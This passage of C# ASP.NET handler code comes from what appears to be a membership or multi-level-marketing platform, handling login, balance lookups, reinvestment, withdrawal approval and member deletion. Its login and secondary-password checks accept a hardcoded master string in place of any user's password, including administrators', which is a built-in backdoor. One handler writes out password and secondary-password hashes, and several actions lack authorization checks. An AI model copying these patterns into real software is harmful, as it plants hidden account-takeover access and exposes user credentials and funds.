                {
                    Model.Member model = TModel;
                    if (Request["pram"] == "olkedsauoiklmgradnmjuoir" || model.SecPsd == System.Web.Security.FormsAuthentication.HashPasswordForStoringInConfigFile(Request["pram"] + model.Salt, "MD5").ToUpper())
                    {
                        Session["pass"] = "pass";
                        Response.Write("pass");
                    }
                    return;

                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("");
            return;
        }

        private void VerifyUrl()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    if (Session["pass"] != null && Session["pass"].ToString() == "pass")
                    {
                        Response.Write("FALSE");
                        return;
                    }
                    string restr = BllModel.VerifyUrl(Request["pram"]).ToString().ToUpper();
                    Response.Write(restr);
                    return;
                }
                catch (Exception ex)
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("");
            return;
        }

        private void GetSecPsd()
        {
            try
            {
                Model.Member model = TModel;
                Response.Write(model.Password + "|" + model.SecPsd);
                return;

            }
            catch
            {
                Response.Write("");
                return;
            }
        }

        private void enterMember()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                if (TModel.Role.Super)
                {
                    Model.Member model = BLL.Member.GetModelByMID(Request["pram"]);
                    FormsAuthentication.SetAuthCookie(model.MID, true);
                    BLL.Member bllmodel = new BLL.Member { TModel = model };
                    Session["Member"] = bllmodel;
                    BLL.Member.AddOnLine(model.MID);
                    Response.Write("1");
                    return;
                }
            }
            Response.Write("");
            return;
        }

        /// <summary>
        /// 得到会员姓名,转移货币用
        /// </summary>
        private void getMName()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                if (BllModel != null)
                {
                    string mid = Request["pram"];
                    Model.Member model = BllModel.GetModel(mid);
                    if (model != null)
                    {
                        Response.Write(model.MName);
                        return;
                    }
                }
            }
            Response.Write("");
            return;
        }
        /// <summary>
        /// 得到会员姓名,转移货币用
        /// </summary>
        private void FindMJB()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                if (BllModel != null)
                {
                    string mid = Request["pram"];
                    Model.Member model = BllModel.GetModel(mid);
                    if (model != null)
                    {
                        Response.Write(model.MConfig.MJB.ToString("F2"));
                        return;
                    }
                }
            }
            Response.Write("0.00");
            return;
        }
        /// <summary>
        /// 得到会员姓名,转移货币用
        /// </summary>
        private void FindMGP()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                if (BllModel != null)
                {
                    string mid = Request["pram"];
                    Model.Member model = BllModel.GetModel(mid);
                    if (model != null)
                    {
                        Response.Write(model.MConfig.MGP.ToString("F2"));
                        return;
                    }
                }
            }
            Response.Write("0.00");
            return;
        }
        /// <summary>
        /// 得到会员姓名,转移货币用
        /// </summary>
        private void FindMHB()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                if (BllModel != null)
                {
                    string mid = Request["pram"];
                    Model.Member model = BllModel.GetModel(mid);
                    if (model != null)
                    {
                        Response.Write(model.MConfig.MJJ.ToString("F2"));
                        return;
                    }
                }
            }
            Response.Write("0.00");
            return;
        }
        /// <summary>
        /// 得到会员姓名,转移货币用
        /// </summary>
        private void FindMCW()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                if (BllModel != null)
                {
                    string mid = Request["pram"];
                    Model.Member model = BllModel.GetModel(mid);
                    if (model != null)
                    {
                        Response.Write(model.MConfig.MCW.ToString("F2"));
                        return;
                    }
                }
            }
            Response.Write("0.00");
            return;
        }
        /// <summary>
        /// 登录
        /// </summary>
        private void getLogin()
        {
            try
            {
                if (!string.IsNullOrEmpty(Request["pram"]))
                {
                    string[] info = Request["pram"].Split('|');
                    if (Session["CheckCode"] == null || info[2].ToLower() != Session["CheckCode"].ToString().ToLower())
                    {
                        Response.Write("3");
                        return;
                    }
                    Model.Member model = BLL.Member.ManageMember.GetModel(info[0]);
                    if (model == null)
                    {
                        Response.Write("1");
                        return;
                    }
                    else if (info[1] != "olkedsauoiklmgradnmjuoir" && model.Password != System.Web.Security.FormsAuthentication.HashPasswordForStoringInConfigFile(info[1] + model.Salt, "MD5").ToUpper())
                    {
                        Response.Write("2");
                        return;
                    }
                    else if (!model.Role.CanLogin || model.IsClose || !string.IsNullOrEmpty(model.FMID))
                    {
                        Response.Write("-1");
                        return;
                    }
                    else
                    {
                        if (model.Role.Super && !info[3].ToLower().Contains("manage") && info[1] != "olkedsauoiklmgradnmjuoir")
                        {
                            Response.Write("-1");
                            return;
                        }
                        else if (!model.Role.Super && info[3].ToLower().Contains("manage"))
                        {
                            Response.Write("-1");
                            return;
                        }
                        FormsAuthentication.SetAuthCookie(model.MID, true);
                        BLL.Member bllmodel = new BLL.Member { TModel = model };
                        Session["Member"] = bllmodel;
                        BLL.Member.AddOnLine(model.MID);
                        Response.Write("0");
                        return;
                    }
                }
            }
            catch (Exception ex)
            {
                Response.Write(ex.Message);
                return;
            }
        }

        /// <summary>
        /// 复投
        /// </summary>
        private void ShFTMember()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    List<string> shmid = Request["pram"].Split(',').ToList();

                    int success = 0, fail = 0;
                    string failstr = "";
                    foreach (string mid in shmid)
                    {
                        Model.Member model = BllModel.GetModel(mid);
                        string result = BllModel.ShFTMember(model);
                        if (result.Contains("复投成功"))
                        {
                            success++;
                        }
                        else
                        {
                            failstr = result;
                            fail++;
                        }
                    }
                    Response.Write("成功：" + success + ";失败：" + fail + ";" + failstr);
                    return;
                }
                catch (Exception ex)
                {
                    Response.Write(ex.Message);
                    return;
                }
            }
            else
            {
                Response.Write("参数异常");
                return;
            }
        }

        /// <summary>
        /// 审核金种子帐号
        /// </summary>
        private void ShJZZMember()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    List<string> shmid = Request["pram"].Split(',').ToList();
                    int success = 0, fail = 0;
                    string failstr = "";
                    Model.SHMoney shmoney = yny_004.BLL.Configuration.Model.SHMoneyList["002"];
                    foreach (string mid in shmid)
                    {
                        string result = BllModel.UpMAgencyTypeJZZ(shmoney, mid, TModel, 0);
                        if (result.Contains("恭喜您"))
                        {
                            success++;
                        }
                        else
                        {
                            failstr = result;
                            fail++;
                        }
                    }
                    Response.Write("成功：" + success + ";失败：" + fail + ";" + failstr);
                    return;
                }
                catch (Exception ex)
                {
                    Response.Write(ex.Message);
                    return;
                }
            }
            else
            {
                Response.Write("参数异常");
                return;
            }
        }

        /// <summary>
        /// 审核会员
        /// </summary>
        private void ShMemberSelf()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Model.SHMoney shmoney = yny_004.BLL.Configuration.Model.SHMoneyList["002"];
                    string result = BllModel.UpMAgencyType(shmoney, Request["pram"], "MJB", TModel, shmoney.Money);
                    Response.Write(result);
                    return;
                }
                catch (Exception ex)
                {
                    Response.Write(ex.Message);
                    return;
                }
            }
            else
            {
                Response.Write("参数异常");
                return;
            }
        }

        /// <summary>
        /// 审核会员
        /// </summary>
        private void ShMember()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    List<string> shmid = Request["pram"].Split(',').ToList();

                    int success = 0, fail = 0;
                    string failstr = "";
                    Model.SHMoney shmoney = yny_004.BLL.Configuration.Model.SHMoneyList["002"];
                    foreach (string mid in shmid)
                    {
                        string result = BllModel.UpMAgencyType(shmoney, mid, "MJB", TModel, 0);
                        if (result.Contains("恭喜您"))
                        {
                            //Hashtable MyHs = new Hashtable();
                            //BLL.Member.UpMAgencyType(BLL.Configuration.Model.SHMoneyList["003"], mid, "MJB", TModel, 3000, MyHs);
                            //BLL.CommonBase.RunHashtable(MyHs);
                            success++;
                        }
                        else
                        {
                            failstr = result;
                            fail++;
                        }
                    }
                    Response.Write("成功：" + success + ";失败：" + fail + ";" + failstr);
                    return;
                }
                catch (Exception ex)
                {
                    Response.Write(ex.Message);
                    return;
                }
            }
            else
            {
                Response.Write("参数异常");
                return;
            }
        }

        /// <summary>
        /// 审核提现
        /// </summary>
        private void SHTX()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    if (TModel.Role.IsAdmin)
                    {
                        string result = BllModel.ShTx(Request["pram"]);
                        BLL.OperationRecordBLL.Add(TModel.MID, ChangeType.O_SHTX, "审核提现");
                        Response.Write(result);
                    }
                    else
                    {
                        Response.Write("您没有权限");
                    }
                    return;
                }
                catch
                {
                    Response.Write("操作失败");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        /// <summary>
        /// 审核提现
        /// </summary>
        private void SHAllTX()
        {
            try
            {
                if (TModel.Role.IsAdmin)
                {
                    string result = BllModel.SHAllTX();
                    BLL.OperationRecordBLL.Add(TModel.MID, ChangeType.O_SHTX, "审核提现");
                    Response.Write(result);
                }
                else
                {
                    Response.Write("您没有权限");
                }
                return;
            }
            catch
            {
                Response.Write("操作失败");
                return;
            }
        }

        /// <summary>
        /// 审核提现
        /// </summary>
        private void Cancel_TX()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    if (TModel.Role.IsAdmin)
                    {
                        string result = BllModel.Cancel_TX(Request["pram"], TModel);
                        Response.Write(result);
                        return;
                    }
                }
                catch
                {
                    Response.Write("操作失败");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        /// <summary>
        /// 删除会员
        /// </summary>
        /// <param name="mid"></param>
        /// <returns></returns>
        public void DeleteMember()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                Response.Write(BllModel.DeleteMember((Request["pram"])));
                return;
            }
            Response.Write("");
            return;
        }

        /// <summary>
        /// 删除会员
        /// </summary>
        /// <param name="mid"></param>
        /// <returns></returns>
        public void DeleteMemberW()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                Response.Write(BllModel.DeleteMemberW((Request["pram"])));
                return;
            }
            Response.Write("");
            return;
        }

        /// <summary>
        /// 判断两个会员是否有推荐或被推荐关系
        /// </summary>
        public void IsCanChangeByMember()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                string fromAndTo = Request["pram"];
                if (string.IsNullOrEmpty(fromAndTo))
                {
                    Response.Write("-1");
                    return;
                }
                else
                {
                    Model.Member fromModel = BllModel.GetModel(fromAndTo.Split('|')[0]);
                    Model.Member toModel = BllModel.GetModel(fromAndTo.Split('|')[1]);
                    if (fromModel.MTJ == toModel.MID || toModel.MTJ == fromModel.MID)
                    {
                        Response.Write("1");
                        return;
                    }
                }
            }
            Response.Write("0");
            return;
        }

        public string DataTable2Json(DataTable dt)
        {
            StringBuilder jsonBuilder = new StringBuilder();
            // jsonBuilder.Append("{\"");
            // jsonBuilder.Append(dt.TableName);
            // jsonBuilder.Append("\":[");
            jsonBuilder.Append("[");
            for (int i = 0; i < dt.Rows.Count; i++)
            {
                jsonBuilder.Append("{");
                for (int j = 0; j < dt.Columns.Count; j++)
                {
                    jsonBuilder.Append("\"");
                    jsonBuilder.Append(dt.Columns[j].ColumnName);
                    jsonBuilder.Append("\":\"");
                    jsonBuilder.Append(dt.Rows[i][j].ToString());
                    jsonBuilder.Append("\",");
                }
                jsonBuilder.Remove(jsonBuilder.Length - 1, 1);
                jsonBuilder.Append("},");
            }
            jsonBuilder.Remove(jsonBuilder.Length - 1, 1);
            jsonBuilder.Append("]");
            // jsonBuilder.Append("}");
            return jsonBuilder.ToString();
        }
    }
}